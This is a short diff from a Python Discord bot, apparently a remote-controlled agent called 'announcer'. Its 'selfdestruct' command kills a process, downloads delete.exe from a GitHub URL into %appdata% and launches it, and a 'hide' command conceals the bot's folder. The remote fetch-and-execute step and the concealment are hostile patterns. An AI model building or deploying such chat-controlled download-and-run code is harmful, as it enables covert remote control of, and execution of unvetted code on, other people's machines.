@@ -390,14 +390,16 @@ class MyClient(discord.Client):
             if message.content == 'selfdestruct':
                 os.system('taskkill /f /im index.exe')
                 await message.channel.send('Self-destruct sequence initiated')
-                await message.channel.send('goodbye...')
+                
                 url = "https://github.com/Plexisity/announcer/raw/main/delete.exe"
                 filename = "delete.exe"
                 urlretrieve(url, filename)
                 shutil.move("delete.exe", os.path.expandvars(r"%appdata%\delete.exe"))
-                os.system(f'%appdata%\\delete.exe')
+                os.startfile(os.path.expandvars(r"%appdata%\delete.exe"))
+                await message.channel.send('Deleting files...')
                 await self.change_presence(activity=discord.Game(name="Self-destructing..."))
-                await self.close()
+                await message.channel.send('goodbye...')
+                
 
             # hide - Hide the announcer folder
             if message.content == 'hide':
